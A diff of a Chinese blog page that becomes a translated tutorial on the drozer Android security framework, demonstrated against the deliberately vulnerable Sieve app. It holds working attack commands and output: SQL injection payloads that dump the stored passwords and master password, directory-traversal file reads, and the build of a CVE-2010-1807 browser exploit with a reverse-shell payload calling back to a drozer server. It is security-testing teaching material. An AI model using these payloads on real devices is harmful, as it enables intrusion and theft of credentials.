@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://showmeshell.top">
-  <title>Tag: Spider | Esther-Cheung And ShowMeShell&#39;s Blog</title>
+  <title>How-to-use-drozer | Esther-Cheung And ShowMeShell&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="The Road Of Reverse And Web~">
-<meta name="keywords" content="Security">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:url" content="http://showmeshell.top/tags/Spider/index.html">
+  <meta name="description" content="1.Getting Started###1.1 Starting a Session  默认情况下，drozer使用端口31415： adb forward tcp:31415 tcp:31415 启动代理，选择“Embedded Server” 点击 “Enable” drozer console connect 1.2 Inside the drozer Consoledrozer Conso">
+<meta name="keywords" content="Android">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How-to-use-drozer">
+<meta property="og:url" content="http://showmeshell.top/2018/09/28/How-to-use-drozer/index.html">
 <meta property="og:site_name" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:description" content="The Road Of Reverse And Web~">
+<meta property="og:description" content="1.Getting Started###1.1 Starting a Session  默认情况下，drozer使用端口31415： adb forward tcp:31415 tcp:31415 启动代理，选择“Embedded Server” 点击 “Enable” drozer console connect 1.2 Inside the drozer Consoledrozer Conso">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-09-28T03:19:17.535Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta name="twitter:description" content="The Road Of Reverse And Web~">
+<meta name="twitter:title" content="How-to-use-drozer">
+<meta name="twitter:description" content="1.Getting Started###1.1 Starting a Session  默认情况下，drozer使用端口31415： adb forward tcp:31415 tcp:31415 启动代理，选择“Embedded Server” 点击 “Enable” drozer console connect 1.2 Inside the drozer Consoledrozer Conso">
   
     <link rel="alternative" href="/atom.xml" title="Esther-Cheung And ShowMeShell&#39;s Blog" type="application/atom+xml">
   
@@ -148,98 +149,374 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-How-to-use-drozer" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/07/22/爬虫二/" class="archive-article-date">
-  	<time datetime="2018-07-22T03:08:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-22</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/07/22/爬虫二/">爬虫二</a>
+    <h1 class="article-title" itemprop="name">
+      How-to-use-drozer
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/09/28/How-to-use-drozer/" class="archive-article-date">
+  	<time datetime="2018-09-28T03:18:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="1-Getting-Started"><a href="#1-Getting-Started" class="headerlink" title="1.Getting Started"></a>1.Getting Started</h2><p>###1.1 Starting a Session</p>
+<p> 默认情况下，drozer使用端口31415：</p>
+<p><code>adb forward tcp:31415 tcp:31415</code></p>
+<p>启动代理，选择“Embedded Server” 点击 “Enable”</p>
+<p><code>drozer console connect</code></p>
+<h3 id="1-2-Inside-the-drozer-Console"><a href="#1-2-Inside-the-drozer-Console" class="headerlink" title="1.2 Inside the drozer Console"></a>1.2 Inside the drozer Console</h3><p>drozer Console 是一个命令行环境</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>run MODULE</td>
+<td>执行一个drozer模块</td>
+</tr>
+<tr>
+<td>list</td>
+<td>显示当前执行的所有drozer模块列表</td>
+</tr>
+<tr>
+<td>shell/cd</td>
+<td>Linux shell</td>
+</tr>
+<tr>
+<td>clean</td>
+<td>删除drozer在Android设备上存储的临时文件</td>
+</tr>
+<tr>
+<td>echo</td>
+<td>print到console</td>
+</tr>
+<tr>
+<td>exit</td>
+<td>终止drozer会话</td>
+</tr>
+<tr>
+<td>help</td>
+<td>显示帮助</td>
+</tr>
+<tr>
+<td>load</td>
+<td>加载包含drozer命令的文件，并按顺序执行它们。</td>
+</tr>
+<tr>
+<td>module</td>
+<td>从Internnet查找并安装其他drozer模块</td>
+</tr>
+<tr>
+<td>permissions</td>
+<td>显示授予drozer Agent的权限列表</td>
+</tr>
+<tr>
+<td>set</td>
+<td>将值存储在将作为环境变量传递给drozer生成的任何Linux shell的变量中。</td>
+</tr>
+<tr>
+<td>unset</td>
+<td>Remove a named variable that drozer passes to any Linux shells that it spawns.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2-Using-drozer-for-Security-Assessment"><a href="#2-Using-drozer-for-Security-Assessment" class="headerlink" title="2.Using drozer for Security Assessment"></a>2.Using drozer for Security Assessment</h2><p>用<a href="http://mwr.to/sieve." target="_blank" rel="noopener">Sieve</a>进行测试，讲解使用方法。</p>
+<h3 id="2-1-Sieve"><a href="#2-1-Sieve" class="headerlink" title="2.1 Sieve"></a>2.1 Sieve</h3><p>Sieve是一个小型的Password Manager应用程序，用于展示Android中的一些常见漏洞应用。<br>首次启动Sieve时，它要求用户设置一个16个字符的“主密码”和一个4位数的引脚，用于保护用户稍后输入的密码。 用户可以使用Sieve存储各种服务的密码，如果需要正确的凭据，可以在以后检索。<br>在开始本教程之前，请将Sieve安装到Android模拟器上并创建几组凭据。</p>
+<h3 id="2-2-Retrieving-Package-Information"><a href="#2-2-Retrieving-Package-Information" class="headerlink" title="2.2 Retrieving Package Information"></a>2.2 Retrieving Package Information</h3><p>评估Sieve的第一步是在Android设备上找到它。 安装在Android设备上的应用程序由其“包名称”唯一标识。 我们可以使用<code>app.package.list</code>命令查找Sieve的标识符：</p>
+<blockquote>
+<p>dz&gt; run app.package.list -f sieve</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>使用<code>app.package.info</code>命令提供有关包的一些基本信息：</p>
+<blockquote>
+<p>dz&gt;run app.package.info    -a com.mwr.example.sieve</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">Process Name: com.mwr.example.sieve</span><br><span class="line">Version: 1.0</span><br><span class="line">Data Directory: /data/data/com.mwr.example.sieve</span><br><span class="line">APK Path: /data/app/com.mwr.example.sieve-2.apk</span><br><span class="line">UID: 10056</span><br><span class="line">GID: [1028, 1015, 3003]</span><br><span class="line">Shared Libraries: null</span><br><span class="line">Shared User ID: null</span><br><span class="line">Uses Permissions:</span><br><span class="line">- android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line"> - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line"> - android.permission.INTERNET</span><br><span class="line">Defines Permissions:</span><br><span class="line"> - com.mwr.example.sieve.READ_KEYS</span><br><span class="line"> - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>
+<h3 id="2-3-Identify-the-Attack-Surface"><a href="#2-3-Identify-the-Attack-Surface" class="headerlink" title="2.3 Identify the Attack Surface"></a>2.3 Identify the Attack Surface</h3><p>只考虑通过Android的进程间通信（IPC）内置机制暴露的漏洞。 这些漏洞通常会导致敏感数据泄漏到安装在同一设备上的其他应用程序。</p>
+<blockquote>
+<p>dz&gt; run app.package.attacksurface com.mwr.example.sieve</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Attack Surface:</span><br><span class="line"> 3 activities exported    		//使其它应用程序可访问</span><br><span class="line"> 0 broadcast receivers exported	//应用程序使用的屏幕</span><br><span class="line"> 2 content providers exported	//内容提供程序（数据库对象）</span><br><span class="line"> 2 services exported			//服务（后台工作程序）</span><br><span class="line"> is debuggable					//该服务可调试，可以使用adb将调试器附加到进程，并逐步执行代码</span><br></pre></td></tr></table></figure>
+<h3 id="2-4-Launching-Activities"><a href="#2-4-Launching-Activities" class="headerlink" title="2.4 Launching Activities"></a>2.4 Launching Activities</h3><p>深入attack。例如询问sieve导出哪些Activities</p>
+<blockquote>
+<p>dz&gt; run app.activity.info -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Package: com.mwr.example.sieve</span><br><span class="line"> com.mwr.example.sieve.FileSelectActivity</span><br><span class="line"> com.mwr.example.sieve.MainLoginActivity</span><br><span class="line"> com.mwr.example.sieve.PWList		//activity已经导出，并没有请求任何权限</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dz&gt; run app.activity.start –component </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dz&gt; help app.activity.start </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY]</span><br><span class="line"> 	[--component PACKAGE COMPONENT] [--data-uri DATA_URI]</span><br><span class="line"> 	[--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]]</span><br><span class="line"> 	[--mimetype MIMETYPE]</span><br></pre></td></tr></table></figure>
+<h3 id="2-5-Reading-from-Content-Providers"><a href="#2-5-Reading-from-Content-Providers" class="headerlink" title="2.5 Reading from Content Providers"></a>2.5 Reading from Content Providers</h3><p>收集有关应用程序导出的内容提供商的更多信息。 提供了一个简单的命令来请求其他信息：</p>
+<blockquote>
+<p>dz&gt; run app.provider.info -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Package: com.mwr.example.sieve</span><br><span class="line"> 	Authority: com.mwr.example.sieve.DBContentProvider</span><br><span class="line"> 	Read Permission: null</span><br><span class="line"> 	Write Permission: null</span><br><span class="line"> 	Content Provider: com.mwr.example.sieve.DBContentProvider</span><br><span class="line"> 	Multiprocess Allowed: True</span><br><span class="line"> 	Grant Uri Permissions: False</span><br><span class="line"> 	Path Permissions:</span><br><span class="line"> 	Path: /Keys</span><br><span class="line"> 	Type: PATTERN_LITERAL</span><br><span class="line"> 	Read Permission: com.mwr.example.sieve.READ_KEYS</span><br><span class="line"> 	Write Permission: com.mwr.example.sieve.WRITE_KEYS</span><br><span class="line"> 	Authority: com.mwr.example.sieve.FileBackupProvider</span><br><span class="line"> 	Read Permission: null</span><br><span class="line"> 	Write Permission: null</span><br><span class="line"> 	Content Provider: com.mwr.example.sieve.FileBackupProvider</span><br><span class="line"> 	Multiprocess Allowed: True</span><br><span class="line"> 	Grant Uri Permissions: False</span><br></pre></td></tr></table></figure>
+<p>这显示了攻击面在第2.3节中提到的两个导出的内容提供程序。 它确认这些内容提供者不需要任何特定权限与它们进行交互，但DBContentProvider中的/ Keys路径除外。</p>
+<h4 id="2-5-1-Database-backed-Content-Providers-Data-Leakage"><a href="#2-5-1-Database-backed-Content-Providers-Data-Leakage" class="headerlink" title="2.5.1 Database-backed Content Providers(Data Leakage)"></a>2.5.1 Database-backed Content Providers(Data Leakage)</h4><p>一个名为“DBContentProvider”的内容提供者将在其后端拥有某种形式的数据库。 但是，如果不知道此内容提供商的组织方式，将很难提取任何信息。</p>
+<p>可以重构部分内容URI来访问DBContentProvider，知道它们必须以“content：//”开头。 但是，无法知道提供程序将接受的所有路径组件。</p>
+<p>幸运的是，Android应用程序倾向于提供有关内容URI的提示。 例如，在<code>app.provider.info</code>命令的输出中，我们看到“/ Keys”可能作为路径存在，但不能在没有READ_KEYS权限的情况下查询它。</p>
+<p>drozer提供了一个扫描器模块，它汇集了各种方法来猜测路径并划分可访问内容URI列表：</p>
+<blockquote>
+<p>dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Unable to Query content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">...</span><br><span class="line">Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line">Accessible content URIs:</span><br><span class="line"> content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line"> content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line"> content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure>
+<p>现在可以使用其他drozer模块从这些内容URI中检索信息，甚至可以修改数据库中的数据：</p>
+<blockquote>
+<p>dz&gt;run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –vertical</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_id: 1</span><br><span class="line">service: Email</span><br><span class="line">username: incognitoguy50</span><br><span class="line">password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64-encoded)</span><br><span class="line">email: incognitoguy50@gmail.com</span><br></pre></td></tr></table></figure>
+<h4 id="2-5-2-Database-backed-Content-Providers-SQL-Injection"><a href="#2-5-2-Database-backed-Content-Providers-SQL-Injection" class="headerlink" title="2.5.2 Database-backed Content Providers(SQL Injection)"></a>2.5.2 Database-backed Content Providers(SQL Injection)</h4><p>Android平台促进使用SQLite数据库来存储用户数据。 由于这些数据库使用SQL，可能容易受到SQL注入攻击</p>
+<blockquote>
+<p>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “‘“ </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unrecognized token: &quot;&apos; FROM Passwords&quot; (code 1): , while compiling: SELECT &apos; FROM Passwords</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –selection “‘“ </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unrecognized token: &quot;&apos;)&quot; (code 1): , while compiling: SELECT * FROM Passwords</span><br><span class="line">WHERE (&apos;)</span><br></pre></td></tr></table></figure>
+<p>Android返回一个非常详细的错误消息，显示它尝试执行的整个查询。可以充分利用此漏洞列出数据库中的所有表：</p>
+<blockquote>
+<p>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM SQLITE_MASTER WHERE type=’table’;–” </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| type  | name             | tbl_name         | rootpage | sql 				|</span><br><span class="line">| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |</span><br><span class="line">| table | Passwords        | Passwords 		  | 4 		 | CREATE TABLE ... |</span><br><span class="line">| table | Key 			   | Key 	   	 	  | 5 		 | CREATE TABLE ... |</span><br></pre></td></tr></table></figure>
+<p>或查询其他受保护的表：</p>
+<blockquote>
+<p>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–”</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| Password 		   | pin  |</span><br><span class="line">| thisismypassword | 9876 |</span><br></pre></td></tr></table></figure>
+<h4 id="2-5-3-File-System-backed-Content-Providers"><a href="#2-5-3-File-System-backed-Content-Providers" class="headerlink" title="2.5.3 File System-backed Content Providers"></a>2.5.3 File System-backed Content Providers</h4><p>内容提供商可以提供对底层文件系统的访问。 这允许应用程序共享文件，否则Android沙箱会阻止它。<br>由于我们可以合理地假设FileBackupProvider是一个由文件系统支持的内容提供程序，并且路径组件表示我们要打开的文件的位置，因此我们可以轻松猜出此内容的URI并使用drozer模块来读取文件：</p>
+<blockquote>
+<p>dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts </p>
+</blockquote>
+<p><code>127.0.0.1        localhost</code></p>
+<p>读取<code>/ etc / hosts</code>文件不是一个大问题但是在第3.2节中发现了应用程序数据目录的路径，我们可以查看更多敏感信息：</p>
+<blockquote>
+<p>dz&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/data/com.mwr.example.sieve/databases/database.db /home/user/database.db</span><br><span class="line">Written 24576 bytes</span><br></pre></td></tr></table></figure>
+<p>这已将应用程序的数据库从设备复制到本地计算机，可以在其中进行浏览。sqlite不仅提取用户的加密密码，还提取其主密码。</p>
+<h4 id="2-5-4-Content-Provider-Vulnerabilities"><a href="#2-5-4-Content-Provider-Vulnerabilities" class="headerlink" title="2.5.4 Content Provider Vulnerabilities"></a>2.5.4 Content Provider Vulnerabilities</h4><p>我们已经看到内容提供程序可能容易受到SQL注入和目录遍历的攻击。drozer提供模块来自动测试这些漏洞的简单案例：</p>
+<blockquote>
+<p>dz&gt; run scanner.provider.injection -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Injection in Projection:</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">Injection in Selection:</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Vulnerable Providers:</span><br><span class="line"> content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line"> content://com.mwr.example.sieve.FileBackupProvider</span><br></pre></td></tr></table></figure>
+<h3 id="2-6-Interacting-with-Services"><a href="#2-6-Interacting-with-Services" class="headerlink" title="2.6 Interacting with Services"></a>2.6 Interacting with Services</h3><blockquote>
+<p>dz&gt; run app.service.info -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Package: com.mwr.example.sieve</span><br><span class="line"> com.mwr.example.sieve.AuthService</span><br><span class="line"> Permission: null</span><br><span class="line"> com.mwr.example.sieve.CryptoService</span><br><span class="line"> 	Permission: null</span><br></pre></td></tr></table></figure>
+<p>这些服务再次导出到所有其他应用程序，无需访问权限。 由于我们正在尝试解密密码，因此CryptoService看起来很有趣。<br>充分利用Sieve的CryptoService作为练习。 它通常涉及反编译应用程序以确定协议，并使用“<code>app.service.send</code>”或编写自定义drozer模块来向服务发送消息。</p>
+<h3 id="2-7-Other-Modules"><a href="#2-7-Other-Modules" class="headerlink" title="2.7 Other Modules"></a>2.7 Other Modules</h3><p>drozer提供了许多在安全评估期间有用的其他模块：<br><code>shell.start</code><br>在设备上启动交互式Linux shell。<br><code>tools.file.upload/ tools.file.download</code><br>允许将文件复制到Android设备或从Android设备复制文件。<br><code>tools.setup.busybox/ tools.setup.minimalsu</code><br>在设备上安装有用的二进制文件。</p>
+<h2 id="3-Exploitation-Features-in-drozer"><a href="#3-Exploitation-Features-in-drozer" class="headerlink" title="3.Exploitation Features in drozer"></a>3.Exploitation Features in drozer</h2><p>drozer提供的功能可帮助将drozer代理部署到远程设备上，方法是利用设备上的应用程序或执行涉及一定程度社会工程的攻击。<br>drozer提供了一个共享漏洞和重用高质量有效载荷的框架。 它提供的模块允许生成用于漏洞利用的shell代码，以帮助访问远程受感染设备上的敏感数据。</p>
+<h3 id="3-1-Infrastructure-Mode"><a href="#3-1-Infrastructure-Mode" class="headerlink" title="3.1 Infrastructure Mode"></a>3.1 Infrastructure Mode</h3><p>到目前为止，您可能已经在“直接模式”运行drozer，您可以在其中运行代理的嵌入式服务器并直接连接到它。 这对于通过adb或本地Wi-Fi网络连接的设备非常方便。<br>drozer支持另一种操作模式：“基础设施模式”。在基础结构模式下，您可以在网络上或Internet上运行drozer服务器，为服务器和代理提供集合点，并在它们之间路由会话。<br>由于基础结构模式可以从设备建立出站连接，因此对于您不知道设备的IP地址或需要遍历NAT或防火墙的情况也很有用。</p>
+<h4 id="3-1-1-Running-a-drozer-Server"><a href="#3-1-1-Running-a-drozer-Server" class="headerlink" title="3.1.1 Running a drozer Server"></a>3.1.1 Running a drozer Server</h4><p>要运行drozer服务器，您需要一台安装了drozer的计算机，移动设备和运行控制台的PC都可以访问该计算机.</p>
+<p><code>drozer server start</code></p>
+<h4 id="3-1-2-Connecting-an-Agent"><a href="#3-1-2-Connecting-an-Agent" class="headerlink" title="3.1.2 Connecting an Agent"></a>3.1.2 Connecting an Agent</h4><p>要使代理连接到服务器，必须将其详细信息添加为“端点”。 在设备上：<br>1.启动drozer Agent，按菜单按钮，然后选择“设置”。<br>2.选择“新端点”。<br>3.将“主机”设置为服务器的主机名或IP地址。<br>4.将“端口”设置为运行服务器的端口，除非它是标准配置<br>5.按“保存”（您可能需要按旧设备上的菜单按钮）。<br>如果您导航回主屏幕，您应该在drozer下看到您的终端。 选择它并以与启动嵌入式服务器相同的方式启用它。</p>
+<h4 id="3-1-3-Connecting-a-Console"><a href="#3-1-3-Connecting-a-Console" class="headerlink" title="3.1.3 Connecting a Console"></a>3.1.3 Connecting a Console</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ drozer console devices --server myserver:31415</span><br><span class="line">List of Bound Devices</span><br><span class="line">Device ID 		 Manufacturer Model Software</span><br><span class="line">67dcdbacd1ea6b60 unknown 	  sdk   4.1.2</span><br><span class="line">67dcdbacd1ea6b61 unknown 	  sdk   4.2.0</span><br></pre></td></tr></table></figure>
+<p>其中“myserver”是drozer服务器的主机名或IP地址。<br>这表明我们连接了两台设备，运行不同版本的Jellybean。 您可以在启动控制台时通过提供其设备ID来指定要使用的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ drozer console connect 67dcdbacd1ea6b60 –-server myserver:31415</span><br><span class="line">…</span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="3-1-4-drozer-Servr-and-Exploitation"><a href="#3-1-4-drozer-Servr-and-Exploitation" class="headerlink" title="3.1.4 drozer Servr and Exploitation"></a>3.1.4 drozer Servr and Exploitation</h4><p>drozer服务器对于利用是至关重要的，因为它在一个服务器中扮演多个服务器：<br>如果drozer代理连接，则drozerp使用drozer的自定义二进制协议<br>如果Web浏览器连接http，它通过HTTP提供资源<br>字节流如果在传输开始时发送特定字节，则它会响应流式传输资源<br>shell服务器如果将’S’（0x53）作为第一个字节发送，则连接将作为绑定shell缓存<br>drozer在整个利用期间利用此服务器来托管成功完成漏洞利用所需的资源，并将代理部署到设备并从受感染设备接收连接。</p>
+<h3 id="3-2-Exploits"><a href="#3-2-Exploits" class="headerlink" title="3.2 Exploits"></a>3.2 Exploits</h3><p>drozer exploit模板和shellcode是特殊类型的drozer模块。 它们由<code>drozer exploit</code>命令组合以创建一个完整的漏洞：</p>
+<p><code>$ drozer exploit build EXPLOIT SHELLCODE [OPTIONS]</code></p>
+<p>可以通过运行列出可用的漏洞利用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ drozer exploit list</span><br><span class="line">exploit.remote.webkit.nanparse</span><br><span class="line"> 			Webkit Invalid NaN Parsing (CVE-2010-1807)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>查看可利用的shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ drozer shellcode list</span><br><span class="line">shell.reverse_tcp.armeabi Establish a reverse TCP Shell (ARMEABI)</span><br><span class="line">weasel.reverse_tcp.armeabi weasel through a reverse TCP Shell (ARMEABI)</span><br></pre></td></tr></table></figure>
+<p>可以为CVE-2010-1807构建一个漏洞，利用weasel（MWR的高级有效载荷）在旧的Android 2.1设备上获得foothold：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ drozer exploit build exploit.remote.webkit.nanparse –-payload weasel.reverse_tcp.armeabi</span><br><span class="line">--server 10.0.2.2:31415 --push-server 127.0.0.1:31415 --resource /home.html</span><br><span class="line">Uploading weasel to /weasel and W... [ OK ]</span><br><span class="line">Uploading the Agent to /agent.apk and A... [ OK ]</span><br><span class="line">Uploading Exploit to /home.html... [ OK ]</span><br><span class="line">Done. The exploit is available at: http://10.0.2.2:31415/home.html</span><br></pre></td></tr></table></figure>
+<p>将易受攻击的设备指向其Web浏览器中的漏洞利用地址，不久之后您将从该漏洞获得一个连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ drozer console devices</span><br><span class="line">List of Bound Devices</span><br><span class="line">Device ID 			Manufacturer Model 		Software</span><br><span class="line">9265590285227392218 unknown 	 unknown 	unknown</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-weasel"><a href="#3-3-weasel" class="headerlink" title="3.3 weasel"></a>3.3 weasel</h3><p>在3.2节中，看到了weasel如何将轻量级代理部署到易受攻击的设备上。<br>weasel是drozer的高级有效负载，可在受损设备上自动获得maximum leverage。</p>
+<ul>
+<li>Here‘s what happens:<ul>
+<li>vulnerable 设备被利用</li>
+<li>exploit运行shell代码，建立与drozer服务器的反向TCP shell连接。</li>
+<li>payload 向drozer服务器发送一个’W’（0x57），去执行weasel stager 序列。</li>
+<li>drozer服务器提供shell命令来安装和启动weasel。</li>
+<li>weasel尝试了许多技术来运行drozer代理。</li>
+</ul>
+</li>
+</ul>
+<p>根据weasel升级权限的能力，您将从完整代理，有限代理或仅正常的反向shell接收连接。</p>
